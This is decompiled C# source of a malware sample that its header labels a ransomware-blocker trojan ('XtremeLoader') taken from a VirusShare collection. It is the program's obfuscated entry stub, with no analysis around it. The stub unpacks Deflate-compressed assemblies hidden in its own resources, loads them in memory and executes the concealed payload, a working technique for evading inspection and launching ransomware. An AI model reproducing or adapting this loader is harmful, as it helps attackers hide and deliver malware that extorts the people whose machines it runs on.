// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: XtremeLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FF5C2739-BB51-401B-85EA-0335ADE5C685
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-21e9df906318ab2f85b91cffd6076e739e3b368473255154a9776c32cfab14d2.exe

using \u0023E;
using \u0023g;
using \u0023M;
using SmartAssembly.MemoryManagement;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;

internal class \u003CModule\u003E
{
  [STAThread]
  public static int \u0023b([In] string[] obj0)
  {
    if (true)
      goto label_2;
label_1:
    AppDomain currentDomain = AppDomain.CurrentDomain;
    currentDomain.AssemblyResolve += new ResolveEventHandler(\u003CModule\u003E.\u0023c);
    return currentDomain.ExecuteAssemblyByName(new AssemblyName(\u0023L.\u0023K(68)), (Evidence) null, obj0);
label_2:
    MemoryManager.\u0023e();
    goto label_1;
  }

  public static Assembly \u0023c([In] object obj0, [In] ResolveEventArgs obj1) => \u003CModule\u003E.\u0023d(Convert.ToBase64String(Encoding.Default.GetBytes(obj1.Name.ToLowerInvariant())));

  public static Assembly \u0023d([In] string obj0)
  {
    using (Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(obj0))
    {
      Stream input1 = manifestResourceStream;
      if (input1 == null)
        return (Assembly) null;
      int count = new BinaryReader(input1).ReadInt32();
      using (DeflateStream input2 = new DeflateStream(manifestResourceStream, CompressionMode.Decompress))
        return Assembly.Load(new BinaryReader((Stream) input2).ReadBytes(count));
    }
  }

  static \u003CModule\u003E()
  {
    \u0023f.\u0023e();
    \u0023D.\u0023e();
  }
}
